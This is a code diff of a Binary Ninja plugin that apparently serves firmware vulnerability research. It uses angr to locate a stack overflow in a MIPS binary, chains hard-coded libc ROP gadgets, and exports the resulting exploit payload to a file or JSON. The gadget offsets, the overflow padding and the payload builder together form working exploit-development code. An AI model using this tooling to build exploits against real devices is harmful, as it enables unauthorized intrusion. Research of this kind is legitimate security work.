@@ -13,7 +13,9 @@ import binaryninja as binja
 from binaryninja import BinaryView, SectionSemantics
 from abc import ABC, abstractmethod
 import os
+import json
 import collections
+import binascii
 from pwn import *
 
 BinaryView.set_default_session_data("find_list", set())
@@ -29,9 +31,11 @@ class Explorer(ABC):
     @abstractmethod
     def run(self):
         pass
+
     @abstractmethod
     def explore(self):
         pass
+
 
 class UIPlugin():
 
@@ -44,7 +48,7 @@ class UIPlugin():
             data = registers
         for reg in data:
             binja.log_info("${0}: {1}".format(reg, state.regs.get(reg)))
-    
+
     @classmethod
     def color_path(self, bv, addr):
         # Highlight the instruction in green
@@ -55,7 +59,7 @@ class UIPlugin():
                 HighlightStandardColor.GreenHighlightColor, alpha=128))
             block.function.set_auto_instr_highlight(
                 addr, HighlightStandardColor.GreenHighlightColor)
-    
+
     @classmethod
     def clear_color_path(self, bv):
         for addr in bv.session_data.find_list:
@@ -66,19 +70,21 @@ class UIPlugin():
                 block.function.set_auto_instr_highlight(
                     addr, HighlightStandardColor.NoHighlightColor)
 
+
 class AngrRunner(BackgroundTaskThread):
     def __init__(self, bv, explorer):
         BackgroundTaskThread.__init__(
             self, "Vulnerability research with angr started...", can_cancel=True)
         self.bv = bv
         self.explorer = explorer
-    
+
     def run(self):
         self.explorer.run()
 
     @classmethod
     def cancel(self, bv):
         UIPlugin.clear_color_path(bv)
+
 
 class BackgroundTaskManager():
     def __init__(self, bv):
@@ -106,7 +112,7 @@ class BackgroundTaskManager():
     @classmethod
     def build_rop(self, bv):
         self.proj = angr.Project(bv.file.filename, ld_path=[
-                        '/home/horac/Research/firmware/poc/fmk/rootfs/lib'], use_system_libs=False)
+            '/home/horac/Research/firmware/poc/fmk/rootfs/lib'], use_system_libs=False)
         self.libc = self.proj.loader.shared_objects['libc.so.0']
         self.libc_base = self.libc.min_addr
         self.gadget1 = self.libc_base+0x00055c60
@@ -115,29 +121,36 @@ class BackgroundTaskManager():
         self.gadget4 = self.libc_base+0x000195f4
         self.gadget5 = self.libc_base+0x000154d8
         self.sleep = self.libc_base + 0x00053ca0
-        
-        self.init = b"A"*160 + b"BBBB"+p32(self.gadget2, endian='big')+p32(self.gadget1, endian='big')
-        self.rop_explorer = ROPExplorer(bv, self.init, self.proj, first=self.gadget1, second=self.gadget2, 
-        third=self.gadget3, fourth=self.gadget4, fifth=self.gadget5, sixth=self.sleep)
+
+        self.init = b"A"*160 + b"BBBB" + \
+            p32(self.gadget2, endian='big')+p32(self.gadget1, endian='big')
+        self.rop_explorer = ROPExplorer(bv, self.init, self.proj, first=self.gadget1, second=self.gadget2,
+                                        third=self.gadget3, fourth=self.gadget4, fifth=self.gadget5, sixth=self.sleep)
         self.runner = AngrRunner(bv, self.rop_explorer)
         self.runner.start()
 
     @classmethod
-    def exploit_to_file(self,bv):
-        self.exploit_creator = ExploitCreator(bv, self.init,self.payload)
+    def exploit_to_file(self, bv):
+        self.exploit_creator = FileExploitCreator(bv, self.init, self.payload)
         self.runner = AngrRunner(bv, self.exploit_creator)
         self.runner.start()
-        
+
+    @classmethod
+    def exploit_to_json(self, bv):
+        self.json_exploit_creator = JSONExploitCreator(bv, self.init, self.payload)
+        self.runner = AngrRunner(bv, self.json_exploit_creator)
+        self.runner.start()
 
     @classmethod
     def stop(self, bv):
         self.runner.cancel(bv)
 
+
 class VulnerabilityExplorer(Explorer):
     def __init__(self, bv, init_payload):
         self.bv = bv
         self.proj = angr.Project(self.bv.file.filename, ld_path=[
-                            '/home/horac/Research/firmware/poc/fmk/rootfs/lib'], use_system_libs=False)
+            '/home/horac/Research/firmware/poc/fmk/rootfs/lib'], use_system_libs=False)
         self.cfg = self.proj.analyses.CFGFast(regions=[(0x4703f0, 0x4706fc)])
 
         self.init = init_payload
@@ -148,7 +161,8 @@ class VulnerabilityExplorer(Explorer):
         self.proj.hook(0x4706fc, self.explore)
 
     def explore(self, state):
-        UIPlugin.color_path(self.bv, state.solver.eval(state.regs.pc, cast_to=int))
+        UIPlugin.color_path(self.bv, state.solver.eval(
+            state.regs.pc, cast_to=int))
         if state.solver.eval(state.regs.pc, cast_to=int) == 0x4706fc:
             UIPlugin.dump_regs(state, registers)
             return True
@@ -161,7 +175,7 @@ class VulnerabilityExplorer(Explorer):
             found = sm.found[0]
             print("found", found)
             self.identify_overflow(found, registers)
-    
+
     def identify_overflow(self, found, registers=[], silence=True, *exclude):
         data = []
         report = {}
@@ -189,7 +203,7 @@ class VulnerabilityExplorer(Explorer):
             interaction.show_markdown_report(
                 "Vulnerability Info Report", self.get_vuln_report(report))
 
-    def get_vuln_report(self,report):
+    def get_vuln_report(self, report):
         contents = "==== Vulnerability Report ====\r\n\n"
         for key, value in report.items():
             if(key == 'ra'):
@@ -200,7 +214,7 @@ class VulnerabilityExplorer(Explorer):
                 contents += "Register ${0} overwritten after {1} bytes !!!!\r\n\n".format(
                     key, value)
         return contents
-        
+
 
 class ROPExplorer(Explorer):
     def __init__(self, bv, init_payload, project, **kwargs):
@@ -230,18 +244,23 @@ class ROPExplorer(Explorer):
         self.proj.hook(self.end_addr, self.overwrite_ra)
         self.proj.hook(self.gadget1, self.hook_gadget1)
         self.proj.hook(self.gadget2, self.hook_gadget2)  # jalr $t9
-        self.proj.hook(self.gadget2+4, self.hook_gadget2next4)  # lw $s1, 0x28($sp)
-        self.proj.hook(self.gadget2+8, self.hook_gadget2next8)  # lw $s0, 0x24($sp)
+        # lw $s1, 0x28($sp)
+        self.proj.hook(self.gadget2+4, self.hook_gadget2next4)
+        # lw $s0, 0x24($sp)
+        self.proj.hook(self.gadget2+8, self.hook_gadget2next8)
         self.proj.hook(self.gadget3, self.hook_gadget3)  # mov $t9, $s1
-        self.proj.hook(self.gadget3+4, self.hook_gadget3next4)  # lw $ra, 0x24($sp)
-        self.proj.hook(self.gadget3+8, self.hook_gadget3next8)  # lw $s2, 0x20($sp)
-        self.proj.hook(self.gadget3+12, self.hook_gadget3next12)  # lw $s1, 0x1c($sp)
-        self.proj.hook(self.gadget3+16, self.hook_gadget3next16)  # lw $s0, 0x18($sp)
+        # lw $ra, 0x24($sp)
+        self.proj.hook(self.gadget3+4, self.hook_gadget3next4)
+        # lw $s2, 0x20($sp)
+        self.proj.hook(self.gadget3+8, self.hook_gadget3next8)
+        # lw $s1, 0x1c($sp)
+        self.proj.hook(self.gadget3+12, self.hook_gadget3next12)
+        # lw $s0, 0x18($sp)
+        self.proj.hook(self.gadget3+16, self.hook_gadget3next16)
         self.proj.hook(self.gadget4, self.hook_gadget4)  # addiu $s0, $sp, 0x24
         self.proj.hook(self.gadget5+4, self.explore)  # jalr $t9
 
-
-    def get_rop_report(self,state, data, gadget):
+    def get_rop_report(self, state, data, gadget):
         contents = "==== 0x{0:0x} Registers ====\r\n\n".format(gadget)
         for reg in data:
             contents += "${0}: 0x{1:0x}\r\n\n".format(
@@ -250,19 +269,15 @@ class ROPExplorer(Explorer):
 
     def get_stack_report(self, data):
         contents = "====Stack Data ====\r\n\n"
-        for key,value in data.items():
-            if value == p32(self.gadget1, endian='big') or value == p32(self.gadget2, endian='big') or value == p32(self.gadget3, endian='big') or value == p32(self.gadget4, endian='big') or value == p32(self.gadget5, endian='big')  or value == p32(self.sleep, endian='big') :
-                contents += "{0}: {1}\r\n\n".format(key,hex(u32(value, endian='big')))
-            else:
-                contents += "{0}: {1}\r\n\n".format(key,value)
+        for key, value in data.items():
+            contents += "{0}: {1}\r\n\n".format(key.decode(),hex(u32(value, endian='big')))
         return contents
 
     def stack_adjust(self, state, reg, size, data="EEEE", vector_size=32):
         if(size >= 0):
             for i in range(4, size+4, 4):
                 state.memory.store(reg+i, state.solver.BVV(data, 32))
-                self.payload[hex(reg+i)] = data.encode()
-
+                self.payload[hex(reg+i).encode()] = data.encode()
 
     def overwrite_ra(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
@@ -275,14 +290,14 @@ class ROPExplorer(Explorer):
         if pc == self.gadget1:
             self.state_history[hex(self.gadget1)] = state
 
-    def hook_gadget2(self,state):
+    def hook_gadget2(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
         if pc == self.gadget2:
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             self.stack_adjust(state, sp, 0x20, "EEEE")
             # lw $ra, 0x2c($sp)
             state.memory.store(sp+0x2c, state.solver.BVV(self.gadget3, 32))
-            self.payload[hex(sp+0x2c)] = p32(self.gadget3, endian='big')
+            self.payload[hex(sp+0x2c).encode()] = p32(self.gadget3, endian='big')
             self.state_history[hex(self.gadget2)] = state
 
     def hook_gadget2next4(self, state):
@@ -291,7 +306,7 @@ class ROPExplorer(Explorer):
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $s1, 0x28($sp)
             state.memory.store(sp+0x28, state.solver.BVV(self.sleep, 32))
-            self.payload[hex(sp+0x28)] = p32(self.sleep, endian='big')
+            self.payload[hex(sp+0x28).encode()] = p32(self.sleep, endian='big')
 
     def hook_gadget2next8(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
@@ -299,7 +314,7 @@ class ROPExplorer(Explorer):
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $s0, 0x24($sp)
             state.memory.store(sp+0x24, state.solver.BVV("DDDD", 32))
-            self.payload[hex(sp+0x24)] = b'DDDD'
+            self.payload[hex(sp+0x24).encode()] = b'DDDD'
 
     def hook_gadget3(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
@@ -308,14 +323,14 @@ class ROPExplorer(Explorer):
             self.stack_adjust(state, sp, 0x18, "GGGG")
             # gadget3 -> lw $s0, 0x18($sp) => 24 bytes
             self.state_history[hex(self.gadget3)] = state
-        
+
     def hook_gadget3next4(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
         if pc == self.gadget3+4:
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $ra, 0x24($sp)
             state.memory.store(sp+0x24, state.solver.BVV(self.gadget4, 32))
-            self.payload[hex(sp+0x24)] = p32(self.gadget4, endian='big')
+            self.payload[hex(sp+0x24).encode()] = p32(self.gadget4, endian='big')
 
     def hook_gadget3next8(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
@@ -323,7 +338,7 @@ class ROPExplorer(Explorer):
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $s2, 0x20($sp)
             state.memory.store(sp+0x20, state.solver.BVV("CCCC", 32))
-            self.payload[hex(sp+0x20)] = b'CCCC'
+            self.payload[hex(sp+0x20).encode()] = b'CCCC'
 
     def hook_gadget3next12(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
@@ -331,7 +346,7 @@ class ROPExplorer(Explorer):
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $s1, 0x1c($sp)
             state.memory.store(sp+0x1c, state.solver.BVV(self.gadget5, 32))
-            self.payload[hex(sp+0x1c)] = p32(self.gadget5, endian='big')
+            self.payload[hex(sp+0x1c).encode()] = p32(self.gadget5, endian='big')
 
     def hook_gadget3next16(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
@@ -339,7 +354,7 @@ class ROPExplorer(Explorer):
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $s0, 0x18($sp)
             state.memory.store(sp+0x18, state.solver.BVV("FFFF", 32))
-            self.payload[hex(sp+0x18)] = b'FFFF'
+            self.payload[hex(sp+0x18).encode()] = b'FFFF'
 
     def hook_gadget4(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
@@ -347,7 +362,7 @@ class ROPExplorer(Explorer):
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # addiu $s0, $sp, 0x24
             state.memory.store(sp+0x24, state.solver.BVV("SHEL", 32))
-            self.payload[hex(sp+0x24)] = b'SHEL'
+            self.payload[hex(sp+0x24).encode()] = b'SHEL'
             self.state_history[hex(self.gadget4)] = state
 
     def explore(self, state):
@@ -382,23 +397,24 @@ class ROPExplorer(Explorer):
 
             sortedDict = collections.OrderedDict(sorted(self.payload.items()))
             print("Payload", sortedDict)
-            interaction.show_markdown_report('ROP Stack', self.get_stack_report(sortedDict))
+            interaction.show_markdown_report(
+                'ROP Stack', self.get_stack_report(sortedDict))
             BackgroundTaskManager.set_exploit_payload(self.init, sortedDict)
 
 
-class ExploitCreator(Explorer):
-    def __init__(self,bv, init, payload):
+class FileExploitCreator(Explorer):
+    def __init__(self, bv, init, payload):
         self.bv = bv
         self.init = init
         self.payload = payload
-    
+
     def explore(self):
         pass
- 
+
     def generate_exploit(self, payload):
         exploit = self.init
-        for key,value in payload.items():
-            exploit += value 
+        for key, value in payload.items():
+            exploit += value
         return exploit
 
     def run(self):
@@ -411,13 +427,48 @@ class ExploitCreator(Explorer):
         file_exploit.write(exploit)
         file_exploit.close()
         show_message_box("Exploit Creator", "Exploit saved to file",
-                            MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.InformationIcon)
-    
+                         MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.InformationIcon)
+
+
+class JSONExploitCreator(Explorer):
+    def __init__(self, bv, init, payload):
+        self.bv = bv
+        self.init = init
+        self.payload = payload
+
+    def explore(self):
+        pass
+
+    def decode_from_bytes(self,data):
+        decoded_dict = collections.OrderedDict()
+        for k,v in data.items():
+            decoded_dict[k.decode()] = u32(v)
+        return decoded_dict
+
+    def run(self):
+        ordered_dict = self.decode_from_bytes(self.payload)
+        ordered_dict['junk'] = binascii.hexlify(self.init[0:164]).decode()
+        ordered_dict['second'] = u32(self.init[164:168])
+        ordered_dict['first'] = u32(self.init[168:172])
+        # self.payload['init']=self.init
+        data = json.dumps(ordered_dict, ensure_ascii=False, indent=4)
+        prompt_file = get_save_filename_input('filename', 'json')
+        if(not prompt_file):
+            return
+        output_file = open(prompt_file.decode("utf-8")+'.json', 'w')
+        output_file.write(data)
+        output_file.close()
+        show_message_box("Exploit Creator", "Exploit saved as JSON",
+                         MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.InformationIcon)
+
+
 PluginCommand.register(
-    "Angr\PoC\Explore", "Attempt to solve for a path that satisfies the constraints given", BackgroundTaskManager.vuln_explore)
+    "Angr\poc\Explore", "Attempt to solve for a path that satisfies the constraints given", BackgroundTaskManager.vuln_explore)
 PluginCommand.register("Angr\PoC\Build ROP",
                        "Try to build exploit rop chain", BackgroundTaskManager.build_rop)
+PluginCommand.register("Angr\PoC\Generate Exploit\Save as JSON",
+                       "Try to save exploit as JSON", BackgroundTaskManager.exploit_to_json)
 PluginCommand.register("Angr\PoC\Generate Exploit\Save to File",
-                       "Try to build exploit fom rop chain", BackgroundTaskManager.exploit_to_file)                      
+                       "Try to build exploit fom rop chain", BackgroundTaskManager.exploit_to_file)
 PluginCommand.register(
     "Angr\PoC\Clear", "Clear angr path traversed blocks", BackgroundTaskManager.stop)
